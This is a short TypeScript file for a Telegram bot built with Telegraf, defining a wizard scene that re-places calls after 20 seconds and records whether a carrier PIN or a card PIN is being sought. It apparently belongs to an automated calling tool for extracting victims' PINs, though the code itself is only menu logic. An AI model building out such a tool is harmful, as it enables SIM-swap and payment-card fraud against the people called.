import { Scenes } from 'telegraf';
import { pin } from '../steps/pin';

export const pinStepScene = new Scenes.WizardScene('PIN_STEP_ID', ...pin);

pinStepScene.action('noCallAgain', async (ctx) => {
  return ctx.scene.enter('super-wizard');
});

pinStepScene.action('yesCallAgain', async (ctx) => {
  await ctx.replyWithHTML('<i>Calling again in 20 seconds</i>');
  setTimeout(async () => {
    return ctx.wizard.steps[4](ctx);
  }, 20000);
});

pinStepScene.action('carrierPin', async (ctx) => {
  ctx.wizard.state.callData.pinType = 'carrierPin';
  return ctx.wizard.steps[ctx.wizard.cursor](ctx);
});

pinStepScene.action('cardPin', async (ctx) => {
  ctx.wizard.state.callData.pinType = 'cardPin';
  return ctx.wizard.steps[ctx.wizard.cursor](ctx);
});
